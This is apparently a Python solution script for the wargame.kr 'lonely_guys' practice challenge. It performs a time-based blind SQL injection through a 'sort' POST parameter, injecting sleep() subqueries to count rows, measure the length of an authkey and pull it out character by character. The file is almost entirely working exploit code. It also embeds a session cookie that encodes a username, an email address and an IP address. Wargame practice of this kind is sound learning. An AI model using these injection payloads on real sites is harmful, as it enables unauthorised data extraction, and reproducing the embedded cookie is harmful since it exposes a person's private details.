# -*- coding : UTF-8 -*-
import requests
import time
from bs4 import BeautifulSoup
import sys

abc = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

cookies = dict(ci_session='a%3A11%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%227131cf4a282c0e45ed4ac6b8eb640983%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22121.170.91.130%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A115%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F57.0.2987.133+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1494747324%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22name%22%3Bs%3A18%3A%22moonlight_paradice%22%3Bs%3A5%3A%22email%22%3Bs%3A19%3A%22chaneyoon%40gmail.com%22%3Bs%3A4%3A%22lang%22%3Bs%3A3%3A%22kor%22%3Bs%3A11%3A%22achievement%22%3Bs%3A7%3A%22default%22%3Bs%3A5%3A%22point%22%3Bs%3A4%3A%228150%22%3Bs%3A14%3A%22last_auth_time%22%3Bi%3A1494747503%3B%7De2dbfd462124d785d7499420549b066a8b7ee645')


url = 'http://wargame.kr:8080/lonely_guys/'

print("[+] Testing the number of the rows of table 'authkey'")
for i in range(1000):
	data = {'sort': ', if((select count(*) from authkey)=%d,sleep(1),1)' % i}
	time1 = time.time()
	r = requests.post(url, data=data, cookies=cookies)
	time2 = time.time()

	if (time2 - time1) >= 1:    # 서브쿼리의 반환값이 참일 때
		print("[*] The rows number of table authkey : %2d" % i)
		break
	else :
		print("[-] Testing the rows number of table authkey : %2d" % i)




print("\n[+] Testing the length of the authkey")
for i in range(1000):   # i = the length of the authkey
	data = {'sort': ', (select sleep(length((select authkey from authkey))=%d))' % i}
	time1 = time.time()
	r = requests.post(url, data=data, cookies=cookies)
	time2 = time.time()

	if (time2 - time1) >= 1:    # 서브쿼리의 반환값이 참일 때
		print("\r[*] The rows number of table authkey : %2d" % i)
		authLen  = i
		break
	else :
		print("[-] Testing the value : %2d" % i)
		sys.stdout.flush()


result = ''
print("\n[+] Extracting the value of the authkey : ")
for i in range(1, authLen+1):
	for a in abc:
		data = {'sort': ', if(ord(mid((select authkey from authkey),%d,1))=%d,sleep(1),1)' % (i, ord(a))}
		time1 = time.time()
		r = requests.post(url, data=data, cookies=cookies)
		time2 = time.time()

		if (time2 - time1) >= 1:    # 서브쿼리의 반환값이 참임
			print("\r[*] ************ Extract the value : %s ************" % a)
			result += a
			break
		else :
			print("[-] Testing the value(%d) : %s" % (i, a))
	if len(result) != i:
		print("Error..")
		exit()
print("\n[*] The result : " + result)

